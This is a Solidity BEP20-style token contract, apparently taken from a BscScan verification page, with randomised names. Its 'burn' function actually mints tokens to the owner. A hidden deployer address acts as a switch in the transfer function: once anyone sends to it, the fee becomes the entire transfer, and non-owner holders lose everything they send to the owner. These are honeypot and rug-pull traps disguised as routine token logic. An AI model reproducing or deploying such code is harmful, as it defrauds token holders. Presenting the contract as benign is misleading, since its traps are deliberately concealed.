/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-13 22:19:20
 */
pragma solidity >=0.4.11;
contract sVGsbY {
address public  tAUuSe = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
string public  name = "QwixNY";
uint256 public  aJNrFX = 100000000000000000000;
uint256 public  zLmAsc = 100000000000000000000000;
address public  icYjaM = address(0);
address public  bTnsZX = address(0);
uint256 public  OrQCPY = 100000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  ZKleZZ = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  HBhElM = 10000000000000000;
uint256 public constant lwSXFc = 9+1;
address public owner;
address public  rJgHmM = address(0);
uint256 public  uMqJqv = 10000000000000000000000000000;
address public  VxCIyY = address(0);
uint256 public  MUzbHs = 10000000000000000000;
mapping (address => uint256) public balanceOf;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "EUjDLO";
uint256 public  NCqeQR = 100000000000000000000000;
uint8 public constant decimals = 18;
address public  KWqVEy = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  YAbLJJ = 1000000000000000000;
uint256 private  yiwlxN = 10000000000000;
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FrlUSv");
require(to != address(0), "FrlUSv");
require(amount <= balanceOf[from], "FrlUSv");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* lwSXFc/yiwlxN ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ZKleZZ){
yiwlxN = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () public {
ZKleZZ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}